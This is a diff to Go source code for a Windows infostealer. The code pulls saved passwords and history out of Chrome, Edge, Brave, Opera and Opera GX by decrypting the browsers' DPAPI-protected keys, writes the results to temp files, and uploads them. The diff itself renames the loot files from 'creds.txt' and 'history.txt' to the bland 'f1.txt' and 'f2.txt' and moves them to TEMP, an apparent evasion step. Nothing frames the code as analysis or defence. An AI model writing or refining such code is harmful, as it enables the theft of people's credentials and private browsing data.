@@ -21,9 +21,9 @@ import (
 
 var (
 	BroswPath=os.Getenv("USERPROFILE")+"\\AppData\\Local"
-	Tmpfile=os.Getenv("APPDATA")+"\\tmp.dat"
-	Credfile=os.Getenv("APPDATA")+"\\creds.txt"
-	Histfile=os.Getenv("APPDATA")+"\\history.txt"
+	Tmpfile=os.Getenv("TEMP")+"\\tmp.dat"
+	File1=os.Getenv("TEMP")+"\\f1.txt"					//Credentials file
+	File2=os.Getenv("TEMP")+"\\f2.txt"					//History file
 	Chrome="\\Google\\Chrome\\User Data"
 	Edge="\\Microsoft\\Edge\\User Data"
 	Brave="\\BraveSoftware\\Brave-Browser\\User Data"
@@ -47,7 +47,7 @@ func secret_key(lspath string)([]byte, error){
 	var result map[string]interface{}
 	json.Unmarshal([]byte(byteval),&result)
 	decodedkey, err := base64.StdEncoding.DecodeString(result["os_crypt"].(map[string]interface{})["encrypted_key"].(string))
-	key, err = dpapi.DecryptBytes(decodedkey[5:])		//the encrypted key starts with "DPAPI"
+	key, err = dpapi.DecryptBytes(decodedkey[5:])				//The encrypted key starts with "DPAPI"
 	if err != nil{
 		return key, err
 	}
@@ -55,7 +55,7 @@ func secret_key(lspath string)([]byte, error){
 }
 
 func decrypt(password, key []byte)(string,error){
-	password=password[3:]								//every encrypted password starts with "v10"
+	password=password[3:]							//Every encrypted password starts with "v10"
 	aesdc, _ := aes.NewCipher(key)
 	gcm, err := cipher.NewGCM(aesdc)
 	noncesize := gcm.NonceSize()
@@ -93,8 +93,8 @@ func create_db_connection(pathdb string)(*sql.DB, error){
 }
 
 func let_him_cook(path string)(){
-	f, _ := os.OpenFile(Credfile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
-	ff, _ := os.OpenFile(Histfile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	f, _ := os.OpenFile(File1, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	ff, _ := os.OpenFile(File2, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	defer f.Close()
 	defer ff.Close()
 	secret, err := secret_key(path+"\\Local State")
@@ -106,13 +106,13 @@ func let_him_cook(path string)(){
 		return
 	}
 	var profiles []string
-	profiles=append(profiles, "")		//this is just for opera GX
+	profiles=append(profiles, "")						//This is just for opera GX
 	for _, folder := range folders {
-		if match, _ := regexp.MatchString("^Profile*|^Default$",folder.Name()); match{
+		if match, _ := regexp.MatchString("^Profile*|^Default$", folder.Name()); match{
 			profiles = append(profiles, folder.Name())
 		}
-	}
-	ihateoperagx, err := os.ReadDir(filepath.Join(path, "_side_profiles"))	//profiles for opera GX
+	}									//Profiles for opera GX
+	ihateoperagx, err := os.ReadDir(filepath.Join(path, "_side_profiles"))
 	if err == nil {
 		for _, folder := range ihateoperagx {
 			if folder.IsDir() {
@@ -173,6 +173,6 @@ func main(){
 	let_him_cook(BroswPath+Brave)
 	let_him_cook(os.Getenv("APPDATA")+Opera)
 	let_him_cook(os.Getenv("APPDATA")+OperaGX)
-	upload_file(Credfile)
-	upload_file(Histfile)
+	upload_file(File1)
+	upload_file(File2)
 }
